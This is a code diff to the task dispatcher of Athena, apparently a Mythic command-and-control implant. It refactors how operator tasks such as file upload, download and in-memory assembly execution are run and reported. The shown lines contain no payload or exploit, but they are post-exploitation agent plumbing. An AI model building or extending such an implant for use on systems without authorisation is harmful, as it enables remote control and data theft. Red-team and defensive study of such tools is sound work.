@@ -1,5 +1,7 @@
 ﻿using Athena.Commands.Model;
-using Athena.Mythic.Model;
+using Athena.Models.Athena.Assembly;
+using Athena.Models.Athena.Commands;
+using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
@@ -15,8 +17,6 @@ namespace Athena.Commands
     {
         public static void StartJob(MythicJob job)
         {
-            //MythicJob job = Globals.jobs[task.task.id];
-            //job.started = true;
             switch (job.task.command)
             {
                 case "download":
@@ -73,9 +73,6 @@ namespace Athena.Commands
                                         Globals.alc = new ExecuteAssemblyContext();
                                         return;
                                     }
-
-
-
                                     //Globals.executeAseemblyThread = new Thread(() =>
                                     //{
 
@@ -320,7 +317,6 @@ namespace Athena.Commands
                     }, job.cancellationtokensource.Token);
                     break;
                 case "upload":
-                    //This doesn't task from mythic for some reason
                     var uploadTask = Task.Run(() =>
                     {
                         try
@@ -338,55 +334,11 @@ namespace Athena.Commands
                                 
                                 //Add job to job tracking Dictionary
                                 Globals.uploadJobs.Add(uj.task.id, uj);
-                               
-                                
-                                /**
-                                while(uj.total_chunks == 0)
-                                {
-                                    //wait for total_chunks to be populated.
-                                }
-
-                                while(uj.chunk_num != uj.total_chunks+1)
-                                {
-                                    if (job.cancellationtokensource.IsCancellationRequested)
-                                    {
-                                        job.complete = true;
-                                        job.taskresult = "Task cancelled by user.";
-                                        job.hasoutput = true;
-                                        uj.complete = true;
-                                    }
-                                    if (!uj.locked && uj.chunkUploads.Count() > 0)
-                                    {
-                                        try
-                                        {
-                                            Misc.AppendAllBytes(uj.path, Misc.Base64DecodeToByteArray(uj.chunkUploads[uj.chunk_num]));
-                                            //Finished with chunk, remove it.
-                                            uj.chunkUploads.Remove(uj.chunk_num);
-                                            uj.chunk_num++;
-                                            job.hasoutput = true;
-                                            job.taskresult = "";
-                                            uj.uploadStarted = true;
-                                        }
-                                        catch (Exception e)
-                                        {
-                                            job.complete = true;
-                                            job.errored = true;
-                                            job.taskresult = e.Message;
-                                            job.hasoutput = true;
-                                            uj.complete = true;
-                                        }
-
-                                    }
-                                }
-                                **/
-                                job.complete = true;
-                                job.taskresult = "File Uploaded Successfully.";
-                                job.hasoutput = true;
-                                uj.complete = true;
                             }
                         }
                         catch (Exception e)
                         {
+                            Misc.WriteError(e.Message);
                             job.taskresult = e.Message;
                             job.complete = true;
                             job.hasoutput = true;
@@ -403,7 +355,6 @@ namespace Athena.Commands
                     break;
             }
         }
-
         static void consoleWriter_WriteLineEvent(object sender, ConsoleWriterEventArgs e)
         {
             try
@@ -421,14 +372,11 @@ namespace Athena.Commands
         {
             if (Globals.loadedcommands.ContainsKey(job.task.command))
             {
-                job.taskresult =  AssemblyHandler.RunLoadedCommand(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
+                PluginResponse pr = AssemblyHandler.RunLoadedCommand(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
+                job.taskresult = pr.output;
+                job.errored = !pr.success;
                 job.complete = true;
                 job.hasoutput = true;
-                if (job.taskresult.StartsWith("[ERROR]"))
-                {
-                    job.errored = true;
-                    job.taskresult = job.taskresult.Replace("[ERROR]", "");
-                }
             }
             else
             {
